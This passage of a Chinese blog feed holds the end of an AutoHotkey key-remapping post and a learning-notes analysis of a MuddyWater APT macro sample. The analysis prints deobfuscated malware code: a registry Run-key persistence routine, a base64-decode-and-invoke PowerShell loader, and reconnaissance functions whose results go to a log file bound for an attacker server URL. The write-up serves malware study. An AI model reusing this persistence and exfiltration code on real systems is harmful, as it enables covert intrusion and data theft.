class="line">;方向键映射</span><br><span class="line"></span><br><span class="line">Esc &amp; h::Send, &#123;Left&#125;</span><br><span class="line">Esc &amp; j::Send, &#123;Down&#125;</span><br><span class="line">Esc &amp; k::Send, &#123;Up&#125;</span><br><span class="line">Esc &amp; l::Send, &#123;Right&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;单词移动</span><br><span class="line">Esc &amp; o::Send, ^&#123;left&#125;</span><br><span class="line">Esc &amp; p::Send, ^&#123;Right&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;翻页</span><br><span class="line">Esc &amp; &apos;::Send, &#123;PgUp&#125;</span><br><span class="line">Esc &amp; /::Send, &#123;PgDn&#125;</span><br><span class="line"></span><br><span class="line">;选择一个单词</span><br><span class="line">Esc &amp; y::Send, +^&#123;Left&#125;</span><br><span class="line">Esc &amp; u::Send, +^&#123;Right&#125;</span><br><span class="line"></span><br><span class="line">;选择字符</span><br><span class="line">Esc &amp; n::Send, ^&#123;Left&#125;</span><br><span class="line">Esc &amp; m::Send, ^&#123;Right&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;选择一行</span><br><span class="line">Esc &amp; [::Send, +&#123;home&#125;</span><br><span class="line">Esc &amp; ]::Send, +&#123;end&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;home</span><br><span class="line">Esc &amp; ,::Send, &#123;home&#125;</span><br><span class="line">;End</span><br><span class="line">Esc &amp; .::Send, &#123;end&#125;</span><br><span class="line"></span><br><span class="line">;窗口移动</span><br><span class="line">Esc &amp; 7::Send, #&#123;Left&#125;</span><br><span class="line">Esc &amp; 0::Send, #&#123;Right&#125;</span><br><span class="line">Esc &amp; 8::Send, #&#123;Down&#125;</span><br><span class="line">Esc &amp; 9::Send, #&#123;Up&#125;</span><br><span class="line"></span><br><span class="line">;删除</span><br><span class="line">Esc &amp; i::Send, &#123;BackSpace&#125;</span><br><span class="line">;刷新</span><br><span class="line">Esc &amp; 5::Send, &#123;f5&#125;</span><br><span class="line"></span><br><span class="line">;任务视窗切换</span><br><span class="line">Esc &amp; g:: Send, ^!&#123;Tab&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;shift+esc</span><br><span class="line">+Esc::Send, +&#123;Esc&#125;</span><br><span class="line"></span><br><span class="line">;虚拟桌面</span><br><span class="line">Esc &amp; t:: Send, #&#123;Tab&#125;</span><br><span class="line">Esc &amp; d:: Send, #^d</span><br><span class="line">Esc &amp; f4:: Send, #^&#123;f4&#125;</span><br><span class="line">Esc &amp; v:: Send, #^&#123;left&#125;</span><br><span class="line">Esc &amp; b:: Send, #^&#123;right&#125;</span><br><span class="line"></span><br><span class="line">;置顶</span><br><span class="line">#t::</span><br><span class="line">WinSet AlwaysOnTop,On,A</span><br><span class="line">return</span><br><span class="line">#^t::</span><br><span class="line">WinSet AlwaysOnTop,Off,A</span><br><span class="line">return</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://yanzhantao.com/windows-scancode-map.html" target="_blank" rel="noopener">https://yanzhantao.com/windows-scancode-map.html</a></p><p><a href="https://github.com/randyrants/sharpkeys" target="_blank" rel="noopener">https://github.com/randyrants/sharpkeys</a></p><p><a href="https://www.autohotkey.com/" target="_blank" rel="noopener">https://www.autohotkey.com/</a></p><p><a href="https://wyagd001.github.io/zh-cn/docs/AutoHotkey.htm" target="_blank" rel="noopener">https://wyagd001.github.io/zh-cn/docs/AutoHotkey.htm</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="工具" scheme="http://xwdidi.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Autohotkey" scheme="http://xwdidi.top/tags/Autohotkey/"/>
    
  </entry>
  
  <entry>
    <title>MuddyWater(污水) APT样本分析</title>
    <link href="http://xwdidi.top/2019/10/06/2019-10-06-MuddyWater(%E6%B1%A1%E6%B0%B4)%20APT%E5%88%86%E6%9E%90/"/>
    <id>http://xwdidi.top/2019/10/06/2019-10-06-MuddyWater(污水) APT分析/</id>
    <published>2019-10-05T16:00:00.000Z</published>
    <updated>2019-11-28T14:44:49.947Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文分析作为学习参考的笔记记录.记录整体细节和不曾知道的地方.</p><p>参考与学习的地址为:<a href="https://bbs.pediy.com/thread-252477.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252477.htm</a></p><p>脚本类恶意程序分析技巧汇总:<a href="https://bbs.pediy.com/thread-251102.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251102.htm</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/8659004.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/8659004.html</a></p><p>谢谢师傅的分析文章.</p><h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><p>微步在线搜寻md5=6cb076f1f42573c5c43083a89bcfe442,下载样本文件并且改名.虚拟机使用<code>Office Tool Plus</code>安装office.</p><p>使用hashcalc:    </p><table><thead><tr><th style="text-align:left">SHA1</th><th>4e68e2040acade6369d938f96c95ada050a8e061</th></tr></thead><tbody><tr><td style="text-align:left">SHA-256</td><td>36ccae4dffc70249c79cd3156de1cd238af8f7a3e47dc90a1c33476cf97a77b0</td></tr></tbody></table><h3 id="恶意宏代码"><a href="#恶意宏代码" class="headerlink" title="恶意宏代码"></a>恶意宏代码</h3><p><code>OfficeMalScanner.exe  &quot;Zakupki_Agency on Public Procurement.doc&quot;  info</code>提取宏汇编,<code>atl+F11</code>打开VBA编辑器然后启动内容也可以.</p><p>五个文件分别是:<img src="https://i.loli.net/2019/09/30/TFZtEuR9N4Jc5pj.png" alt></p><h4 id="1-ThisDocument"><a href="#1-ThisDocument" class="headerlink" title="1.ThisDocument"></a>1.ThisDocument</h4><p><img src="https://i.loli.net/2019/09/30/hwzPVutOI8raYJH.png" alt="image.png"></p><p>动态调试F8,会跳出UTF-8窗口.跳转到frmLoadr.Show函数内部.</p><h4 id="2-frmLoadr"><a href="#2-frmLoadr" class="headerlink" title="2.frmLoadr"></a>2.frmLoadr</h4><p><img src="https://i.loli.net/2019/09/30/ovtTYUskGDfQr9j.png" alt="image.png"></p><p>按钮调用buttonQWERTY_Click()函数.给RgSH传入参数7.然后动态调试跳转到<code>RgSH(id)函数</code></p><h4 id="3-RgSH-id"><a href="#3-RgSH-id" class="headerlink" title="3. RgSH(id)"></a>3. RgSH(id)</h4><p><img src="https://i.loli.net/2019/10/01/LsIdhwHNiKDA58J.png" alt="image.png"></p><p>根据mlw()函数解密,写一个小脚本就行,再使用MsgBox()打印,这里有个细节oor的时候进行了字符逆序,所以脚本最好添加.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">char = <span class="string">"""sP = mlw(1353) &amp; mlw(1346) &amp; mlw(1349) &amp; mlw(1315) &amp; mlw(1338) &amp; mlw(1336) &amp; mlw(1317) &amp; mlw(1335) &amp; mlw(1351)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1318) &amp; mlw(1293) &amp; mlw(1351) &amp; mlw(1343) &amp; mlw(1352) &amp; mlw(1332) &amp; mlw(1337) &amp; mlw(1336) &amp; mlw(1335)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1327) &amp; mlw(1351) &amp; mlw(1346) &amp; mlw(1346) &amp; mlw(1349) &amp; mlw(1327) &amp; mlw(1281) &amp; mlw(1327) &amp; mlw(1327)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1268) &amp; mlw(1360) &amp; mlw(1336) &amp; mlw(1351) &amp; mlw(1332) &amp; mlw(1345) &amp; mlw(1346) &amp; mlw(1350) &amp; mlw(1349)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1336) &amp; mlw(1347) &amp; mlw(1344) &amp; mlw(1340) &amp; mlw(1267) &amp; mlw(1296) &amp; mlw(1267) &amp; mlw(1343) &amp; mlw(1336)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1353) &amp; mlw(1336) &amp; mlw(1311) &amp; mlw(1345) &amp; mlw(1346) &amp; mlw(1340) &amp; mlw(1351) &amp; mlw(1332) &amp; mlw(1345)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1346) &amp; mlw(1350) &amp; mlw(1349) &amp; mlw(1336) &amp; mlw(1347) &amp; mlw(1344) &amp; mlw(1340) &amp; mlw(1358) &amp; mlw(1293)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1350) &amp; mlw(1351) &amp; mlw(1344) &amp; mlw(1338) &amp; mlw(1344) &amp; mlw(1345) &amp; mlw(1340) &amp; mlw(1354) """</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#去除多余字符</span></span><br><span class="line">char = char.replace(<span class="string">"sP"</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">"="</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">"mlw("</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">")"</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">num = char.split(<span class="string">"&amp;"</span>)</span><br><span class="line"><span class="comment">#字符转数字</span></span><br><span class="line">num = list(map(int,num))</span><br><span class="line">chr = []</span><br><span class="line"><span class="comment">#逆序打印 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(num)<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">num[i] = num[i] <span class="number">-1235</span></span><br><span class="line">print(<span class="string">"chr("</span>+ str(num[i]) +<span class="string">")"</span>,end=<span class="string">''</span>)</span><br><span class="line"><span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">print(<span class="string">"&amp;"</span>,end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/01/7xf1e3Gio4Kha5B.png" alt="image.png"></p><p>最后所有除掉混淆是这样子的.</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> RgSH(id)</span><br><span class="line">b = PuSH(id)</span><br><span class="line">CallByName <span class="string">"winmgmts:&#123;impersonationLevel = impersonate&#125;!\\.\root\default:StdRegProv"</span>, </span><br><span class="line"><span class="string">"SetStringValue"</span>, </span><br><span class="line">VbMethod, </span><br><span class="line">&amp;H80000001, </span><br><span class="line"><span class="string">"Software\Microsoft\Windows\CurrentVersion\Run"</span>, </span><br><span class="line"><span class="string">"VingValue"</span>, </span><br><span class="line"> b</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><p>然后动态调试后b的值为%Temp%\aulmgr.vbe,其中<code>PuSH(id)</code>函数下面会继续分析</p><p><a href="https://msdn.microsoft.com/ja-jp/windows/aa393600(v=vs.80" target="_blank" rel="noopener">以这个为参考</a>)得出这个函数大概作用是获取本地注册表对象,调用<code>SetStringValue</code>,在注册表项为<code>Software\Microsoft\Windows\CurrentVersion\Run</code>,创建键名为”VingValue”,并设定值为b.</p><h4 id="PuSH-id"><a href="#PuSH-id" class="headerlink" title="PuSH(id)"></a>PuSH(id)</h4><p><img src="![image.png](https://i.loli.net/2019/10/01/7xf1e3Gio4Kha5B.png" alt>)</p><p>传入参数7;</p><p>执行函数<code>p = d3r(4) &amp; FuN(1)</code>.先运行跳过得到<code>p = %TEMP%\aulmgr.vbe</code></p><p>然后进行<code>If id Mod 5 = 1</code>如果id模5得1则进行下面的操作:利用<code>CreateTextFile</code>创建<code>%Temp%\aulmgr.vbe,</code>对象并写入标题拼接1-13拼接出来的ddd字符串.</p><h4 id="d3r-id1"><a href="#d3r-id1" class="headerlink" title="d3r(id1)"></a>d3r(id1)</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> d3r(id)</span><br><span class="line"><span class="keyword">Set</span> f = <span class="built_in">CreateObject</span>(<span class="string">"scriPtInG.filesystemObJEct"</span>)</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">Case</span> (id Mod <span class="number">5</span>)</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">d3r = Environ$(<span class="string">"puBLiC"</span>)获取<span class="string">"public"</span>环境便量路径</span><br><span class="line"><span class="keyword">Case</span> <span class="number">1</span></span><br><span class="line">d3r = Environ$(<span class="string">"aPpDaTa"</span>)  获取<span class="string">"aPpDaTa"</span>环境便量路径</span><br><span class="line"><span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">d3r = f.getspecialfolder(<span class="number">0</span>) 获取%SystemRoot%</span><br><span class="line"><span class="keyword">Case</span> <span class="number">3</span></span><br><span class="line">d3r = f.getspecialfolder(<span class="number">1</span>)获取<span class="string">"%SystemRoot%\System32环境便量路径</span></span><br><span class="line"><span class="string">Case 4</span></span><br><span class="line"><span class="string">d3r = f.getspecialfolder(2)获取%Temp%环境便量路径</span></span><br><span class="line"><span class="string">Case Else</span></span><br><span class="line"><span class="string">d3r = ""</span></span><br><span class="line"><span class="string">End Select</span></span><br><span class="line"><span class="string">End Function</span></span><br></pre></td></tr></table></figure><p>去除混淆</p><p><code>FiSA()</code>每次都返回”scriPtInG.filesystemObJEct”.流式文本对象.</p><p><code>getspecialfolder(id)</code>是vbs自带的函数,根据参数的不同获得的值也不一样,0=WindowsFolder,1=SystemFolder,2=TemporaryFolder.</p><h4 id="FuN-id"><a href="#FuN-id" class="headerlink" title="FuN(id)"></a>FuN(id)</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> FuN(id)</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">Case</span> (id Mod <span class="number">5</span>)</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">FuN = <span class="string">"\aaaaa.tmp"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">1</span></span><br><span class="line">FuN = <span class="string">"\aulngr.vbe"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">FuN = <span class="string">"\bbbbbb.tmp"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">3</span></span><br><span class="line">FuN = <span class="string">"\report.xls"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">4</span></span><br><span class="line">FuN = <span class="string">"\report.docx"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span></span><br><span class="line">FuN = <span class="string">""</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><p>宏代码 功能总结</p><p>释放<strong>VBE Loader**</strong>于%temp%\aulmgr.vbe下,并且注册表修改为开机自启动.</p><h3 id="aulngr-vbe-分析"><a href="#aulngr-vbe-分析" class="headerlink" title="aulngr.vbe 分析"></a>aulngr.vbe 分析</h3><p><img src="https://i.loli.net/2019/10/01/YfGXswl4WAt3PJx.png" alt="image.png"></p><table><thead><tr><th>md5</th><th>9d2da5228e21594ab46b4f5281d38b8f</th></tr></thead><tbody><tr><td>sha1</td><td>2b548816eeacd4fd4dee30f46acaecb34b1238e3</td></tr></tbody></table><p>文本看不太懂,根据师傅的报告进行恢复.解除编码后大概这个样子</p><p><img src="https://i.loli.net/2019/10/01/lmN4Lg3Vtb67aj8.png" alt="image.png"></p><p>中间混淆了一大堆看不太懂的的东西,只能看师傅的学习分析.</p><p>去除掉大多数的杂鱼信息,关键字集中在shell</p><p><img src="https://i.loli.net/2019/10/01/fPIcY76Jm9MKVgB.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/10/01/qgUpVZ29GdFXS4T.png" alt="image.png"></p><p>取b的值存储到<code>%public%\UserImage.png</code>中,再使用powershell运行它.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/w: -w is short <span class="keyword">for</span> -WindowStyle</span><br><span class="line">Normal (<span class="number">0</span>)</span><br><span class="line">Maximized (<span class="number">3</span>)</span><br><span class="line">Minimized (<span class="number">2</span>)</span><br><span class="line">Hidden (<span class="number">1</span>)</span><br><span class="line">gc: <span class="built_in">Get-Content</span> 获取内容</span><br><span class="line">iex: <span class="built_in">Invoke-Expression</span>  调用表达式</span><br></pre></td></tr></table></figure><p><a href="https://stackoverflow.com/questions/55775202/what-is-w-1-and-c-in-powershell-command" target="_blank" rel="noopener">参考</a></p><p>然后分析下b的字符串.将base64编码后的字符串存入vv,然后赋予到er变量.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$er</span> = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(<span class="variable">$vv</span>));&amp; (gcm i*v*p*s*n) <span class="variable">$er</span></span><br></pre></td></tr></table></figure><p>然后运行后面的表达式.那<code>gcm i*v*p*s*n</code>是什么呢,powershell跑一下就行了,唯一匹配iex,也就是调用它.<code>$er</code>的意思就是base64解码后按照unicode解析字符串.</p><p>运行一下得到powershell代码的UserImage.png.</p><h3 id="UserImage-png"><a href="#UserImage-png" class="headerlink" title="UserImage.png"></a>UserImage.png</h3><p>C:\Users\Public\UserImage.png(%public%\UserImage.png)</p><table><thead><tr><th>md5</th><th>34a072f42905f9de31523616e8f207b1</th></tr></thead><tbody><tr><td>SHA1</td><td>3d37affb081e7c9586bdac2fe9e45368f812ceb4</td></tr></tbody></table><p>解码其中的base64编码后的powershell代码.使用<a href="http://prettyprinter.de/" target="_blank" rel="noopener">http://prettyprinter.de</a>略微格式化一下.然后ise中调试.</p><h4 id="powershell函数分析"><a href="#powershell函数分析" class="headerlink" title="powershell函数分析"></a>powershell函数分析</h4><h5 id="lTXxzy53"><a href="#lTXxzy53" class="headerlink" title="lTXxzy53()"></a>lTXxzy53()</h5><p><img src="https://i.loli.net/2019/10/01/cFQ8ZgYNJMmoaud.png" alt="image.png">所有函数都如上面一样加密过,动态调试运行<code>i98mG9I84cHnev2ywJGZ</code>解密就行.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> lTXxzy53()</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;<span class="variable">$whj95r69Xal</span> = <span class="variable">$ENV:USERNAME</span>;&#125;</span><br><span class="line">       <span class="keyword">catch</span>&#123;<span class="variable">$whj95R69xAl</span> = (<span class="string">'Error Username'</span>);&#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$whJ95r69xAl</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>获得环境变量下的用户名称.</p><h5 id="NIQCw20"><a href="#NIQCw20" class="headerlink" title="NIQCw20"></a>NIQCw20</h5><p>不太懂</p><h5 id="EdA4VNZrBAU37Pd7ND"><a href="#EdA4VNZrBAU37Pd7ND" class="headerlink" title="EdA4VNZrBAU37Pd7ND()"></a>EdA4VNZrBAU37Pd7ND()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> EdA4VNZrBAU37Pd7ND()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$BtvwpfSFUmi_</span> = <span class="variable">$Env:eDA4VNZrBAU37pD7Nd</span>;&#125;</span><br><span class="line"><span class="keyword">catch</span>&#123;<span class="variable">$btvwpfSfumI_</span> = (<span class="string">'Error UserDomain'</span>);&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$BTvwpfSFumI_</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据下面的提示应该是用户域的名称 <code>%userdomain%</code></p><h5 id="UTFhxPjChlXs1OxREdR"><a href="#UTFhxPjChlXs1OxREdR" class="headerlink" title="UTFhxPjChlXs1OxREdR()"></a>UTFhxPjChlXs1OxREdR()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> UTFhxPjChlXs1OxREdR()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$a3rm5By20VTEfgF04</span> = ls <span class="variable">$enV:USERPROFILE</span>\Desktop;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$A3rm5BY20vteFgF04</span> =<span class="string">"Error ls"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$A3rm5bY20vtEFGF04</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ls遍历桌面文件,错误反汇Errot ls.</p><h5 id="zokOsMYYZQG1GyNMGDZ"><a href="#zokOsMYYZQG1GyNMGDZ" class="headerlink" title="zokOsMYYZQG1GyNMGDZ()"></a>zokOsMYYZQG1GyNMGDZ()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> zokOsMYYZQG1GyNMGDZ()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$zhXA59XV3lDJhu</span> = ps;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$ZHXA59xV3LDjHU</span> = <span class="string">"Error TaskList"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$zHxA59xv3lDjHu</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行指令<code>ps</code>,获得进程列表,错误返回”Error TaskList”.</p><h5 id="sp169N5"><a href="#sp169N5" class="headerlink" title="sp169N5()"></a>sp169N5()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> sp169N5()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$iYwj2qTWWlSlvnB</span> = <span class="built_in">New-Object</span> System.Net.WebClient;</span><br><span class="line">        <span class="variable">$iYwj2QTWwlSLVNb</span>.proxy = [Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">        <span class="variable">$iYWj2QtWwLSLvnB</span>.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;</span><br><span class="line">        <span class="variable">$LaYS5yC59zA8PFhrFm9TP</span>=<span class="variable">$Iywj2qtwwlsLVNB</span>.DownloadString(<span class="string">"http://ip-api.com/json"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$LAYS5yC59zA8PFhRfM9Tp</span> = <span class="string">"Error Remote IP"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$LAYs5yC59za8PFhrFM9TP</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<a href="http://ip-api.com/json下载回显字符,以json格式保存.错误返回`Error" target="_blank" rel="noopener">http://ip-api.com/json下载回显字符,以json格式保存.错误返回`Error</a> Remote IP`返回如下:<img src="https://i.loli.net/2019/10/01/ovf9WC7StRUhTix.png" alt="image.png"></p><h5 id="dYUUIGUfLNIoN"><a href="#dYUUIGUfLNIoN" class="headerlink" title="dYUUIGUfLNIoN()"></a>dYUUIGUfLNIoN()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> dYUUIGUfLNIoN()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$htVH9OtOCbnP7Oa</span> = (<span class="built_in">Get-WMIObject</span> win32_operatingsystem).name;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$HtvH9OtocBNp7OA</span> = <span class="string">"error os Arch"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$htVH9otOCbnp7OA</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取系统信息,错误返回”error os Arch”</p><p><img src="https://i.loli.net/2019/10/01/kJ7VhFmIZYNH1ln.png" alt="image.png"></p><h5 id="L82O-u0EwZy（）"><a href="#L82O-u0EwZy（）" class="headerlink" title="L82O_u0EwZy（）"></a>L82O_u0EwZy（）</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> L82O_u0EwZy()</span><br><span class="line">    &#123;</span><br><span class="line">        lTXXzy53;</span><br><span class="line">        Eda4vnZRBaU37pd7ND;</span><br><span class="line">        zoKoSMyYZqg1gYNmGDZ;</span><br><span class="line">        uTFHxpJCHlXs1OXrEdR;</span><br><span class="line">        SP169n5;</span><br><span class="line">        DyuUigUFlnioN;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>运行上述函数.</p><h5 id="finally部分函数"><a href="#finally部分函数" class="headerlink" title="finally部分函数"></a>finally部分函数</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L82o_u0eWZY | <span class="built_in">out-file</span> <span class="variable">$ENV:temp</span>\log.txt;</span><br><span class="line"><span class="variable">$iYwj2qTwWLslvNB</span> = <span class="built_in">New-Object</span> System.Net.WebClient;</span><br><span class="line"><span class="variable">$IYWj2QtwWLSLVNB</span>.proxy = [Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line"><span class="variable">$iYwj2QTWWLSlVNB</span>.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;</span><br><span class="line"><span class="variable">$m2g9a1mNOtasOaLofMKD</span> = <span class="variable">$EnV:temp</span> +<span class="string">'\log.txt'</span>;</span><br><span class="line"><span class="variable">$QBrjTZAqQWJDJ</span> = <span class="string">"http://185.185.25.175/sDownloads/"</span>;</span><br></pre></td></tr></table></figure><p>运行<code>L82o_u0eWZY</code>,将系统心思保存到<code>%temp%\log.txt</code>中,调试得出<code>$m2g9a1mNOtasOaLofMKD</code>是<code>%temp%\log.txt</code></p><h5 id="K9Dpje9u4bcbqu351w"><a href="#K9Dpje9u4bcbqu351w" class="headerlink" title="K9Dpje9u4bcbqu351w()"></a>K9Dpje9u4bcbqu351w()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span 